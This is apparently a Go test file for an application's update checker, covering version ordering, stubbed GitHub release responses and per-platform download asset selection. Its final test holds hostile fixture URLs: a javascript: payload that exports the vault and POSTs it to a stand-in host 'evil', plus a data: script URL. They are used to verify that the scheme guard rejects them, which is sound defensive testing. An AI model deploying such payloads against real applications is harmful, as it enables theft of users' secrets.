package server

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"runtime"
	"testing"
)

func TestVersionLess(t *testing.T) {
	cases := []struct {
		a, b string
		want bool
	}{
		{"0.9.20", "0.9.21", true},
		{"0.9.20", "0.9.20", false},
		{"0.9.21", "0.9.20", false},
		{"0.9.9", "0.10.0", true}, // numeric, not lexical
		{"1.0.0", "0.9.99", false},
		{"dev", "0.0.1", true}, // non-numeric sorts below any release
		{"v0.9.20", "0.9.21", true},
	}
	for _, c := range cases {
		if got := versionLess(c.a, c.b); got != c.want {
			t.Errorf("versionLess(%q,%q)=%v want %v", c.a, c.b, got, c.want)
		}
	}
}

// stubLatest points githubLatestURL at a test server for the duration of the test.
func stubLatest(t *testing.T, h http.HandlerFunc) {
	t.Helper()
	ts := httptest.NewServer(h)
	t.Cleanup(ts.Close)
	old := githubLatestURL
	githubLatestURL = ts.URL
	t.Cleanup(func() { githubLatestURL = old })
}

func TestUpdateCheckAvailable(t *testing.T) {
	stubLatest(t, func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]string{
			"tag_name": "v0.9.25", "html_url": "https://example.test/rel",
		})
	})
	s := &Server{version: "0.9.20"}
	rec := httptest.NewRecorder()
	s.handleUpdateCheck(rec, httptest.NewRequest(http.MethodGet, "/api/update/check", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}
	var resp updateResponse
	if err := json.NewDecoder(rec.Body).Decode(&resp); err != nil {
		t.Fatal(err)
	}
	if !resp.Available || resp.Latest != "0.9.25" || resp.Current != "0.9.20" || resp.URL == "" {
		t.Fatalf("got %+v, want available v0.9.25", resp)
	}
}

func TestUpdateCheckUpToDate(t *testing.T) {
	stubLatest(t, func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]string{"tag_name": "v0.9.20"})
	})
	s := &Server{version: "0.9.20"}
	rec := httptest.NewRecorder()
	s.handleUpdateCheck(rec, httptest.NewRequest(http.MethodGet, "/", nil))
	var resp updateResponse
	_ = json.NewDecoder(rec.Body).Decode(&resp)
	if resp.Available || resp.Latest != "0.9.20" {
		t.Fatalf("got %+v, want not-available", resp)
	}
}

// The fixture URLs are absolute https because that is what the API returns —
// GitHub's `browser_download_url` is always an absolute https URL. They used to be
// relative ("u/lin-amd64"), which is a shape this code never sees and which hid that
// nothing checked the scheme at all. See TestAssetURLNeverHandsOnANonHTTPURL.
func TestAssetURL(t *testing.T) {
	assets := []asset{
		{Name: "nib-0.9.25-linux-amd64", URL: "https://example.invalid/lin-amd64"},
		{Name: "nib-0.9.25-linux-arm64", URL: "https://example.invalid/lin-arm64"},
		{Name: "nib-0.9.25-darwin-arm64", URL: "https://example.invalid/dar-arm64"},
		{Name: "nib-0.9.25-windows-amd64.exe", URL: "https://example.invalid/win-amd64"},
		{Name: "nib_0.9.25_amd64.deb", URL: "https://example.invalid/deb-amd64"},
		{Name: "nib_0.9.25_arm64.deb", URL: "https://example.invalid/deb-arm64"},
	}
	cases := []struct {
		goos, goarch string
		managed      bool
		want         string
	}{
		{"linux", "amd64", false, "https://example.invalid/lin-amd64"},
		{"linux", "arm64", false, "https://example.invalid/lin-arm64"},
		{"darwin", "arm64", false, "https://example.invalid/dar-arm64"},
		{"windows", "amd64", false, "https://example.invalid/win-amd64"},
		{"linux", "amd64", true, "https://example.invalid/deb-amd64"}, // managed -> the .deb, not the raw binary
		{"linux", "arm64", true, "https://example.invalid/deb-arm64"},
		{"freebsd", "amd64", false, ""}, // no asset for this OS
	}
	for _, c := range cases {
		if got := assetURL(c.goos, c.goarch, c.managed, assets); got != c.want {
			t.Errorf("assetURL(%q,%q,managed=%v) = %q, want %q", c.goos, c.goarch, c.managed, got, c.want)
		}
	}
}

// The handler picks the asset for the running OS/arch when one is published.
func TestUpdateCheckIncludesDownloadURL(t *testing.T) {
	bin := "nib-9.9.9-" + runtime.GOOS + "-" + runtime.GOARCH
	if runtime.GOOS == "windows" {
		bin += ".exe"
	}
	deb := "nib_9.9.9_" + runtime.GOARCH + ".deb"
	stubLatest(t, func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]any{
			"tag_name": "v9.9.9", "html_url": "https://example.test/rel",
			"assets": []map[string]string{
				{"name": bin, "browser_download_url": "https://example.test/bin"},
				{"name": deb, "browser_download_url": "https://example.test/deb"},
			},
		})
	})
	s := &Server{version: "0.0.1"}
	rec := httptest.NewRecorder()
	s.handleUpdateCheck(rec, httptest.NewRequest(http.MethodGet, "/", nil))
	var resp updateResponse
	_ = json.NewDecoder(rec.Body).Decode(&resp)
	if !resp.Available || resp.DownloadURL == "" {
		t.Fatalf("got %+v, want available with a download URL for %s/%s", resp, runtime.GOOS, runtime.GOARCH)
	}
}

func TestUpdateCheckNoReleases(t *testing.T) {
	stubLatest(t, func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusNotFound) })
	s := &Server{version: "0.9.20"}
	rec := httptest.NewRecorder()
	s.handleUpdateCheck(rec, httptest.NewRequest(http.MethodGet, "/", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (404 from GitHub means no releases yet)", rec.Code)
	}
	var resp updateResponse
	_ = json.NewDecoder(rec.Body).Decode(&resp)
	if resp.Latest != "" || resp.Available {
		t.Fatalf("got %+v, want empty latest", resp)
	}
}

// TestAssetURLNeverHandsOnANonHTTPURL.
//
// `assetURL`'s result reaches the client, which does `location.assign(d.downloadUrl)` and
// `window.open(d.url)`. A `javascript:` URL there executes in Nib's own origin — which
// holds the CSRF token and an unlocked vault. Nothing reaches it today: the release listing
// is fetched over TLS from GitHub, so an attacker needs to be GitHub or hold a mis-issued
// certificate. This is the latent-hole case, and the empty-string fallback the caller
// already has (the release page) is exactly the right behaviour for a URL we will not pass on.
//
// The function had NO test of any kind before this one — which is why the scheme was never
// checked in the first place.
func TestAssetURLNeverHandsOnANonHTTPURL(t *testing.T) {
	hostile := []asset{
		{Name: "nib_1.0.0_amd64.deb", URL: "javascript:fetch('/api/vault/export').then(r=>r.text()).then(t=>fetch('//evil',{method:'POST',body:t}))"},
		{Name: "nib-1.0.0-linux-amd64", URL: "data:text/html,<script>alert(1)</script>"},
	}
	for _, managed := range []bool{true, false} {
		if got := assetURL("linux", "amd64", managed, hostile); got != "" {
			t.Errorf("managed=%v: assetURL handed on %q — the client navigates to this "+
				"value in Nib's own origin", managed, got)
		}
	}

	// The control. A guard that returns "" for everything sends every user to the release
	// page forever, which is an update mechanism that has quietly stopped working.
	good := []asset{
		{Name: "nib_1.0.0_amd64.deb", URL: "https://example.invalid/nib_1.0.0_amd64.deb"},
		{Name: "nib-1.0.0-linux-amd64", URL: "https://example.invalid/nib-1.0.0-linux-amd64"},
	}
	if got := assetURL("linux", "amd64", true, good); got != good[0].URL {
		t.Errorf("managed: assetURL = %q, want the .deb URL", got)
	}
	if got := assetURL("linux", "amd64", false, good); got != good[1].URL {
		t.Errorf("standalone: assetURL = %q, want the binary URL", got)
	}
}
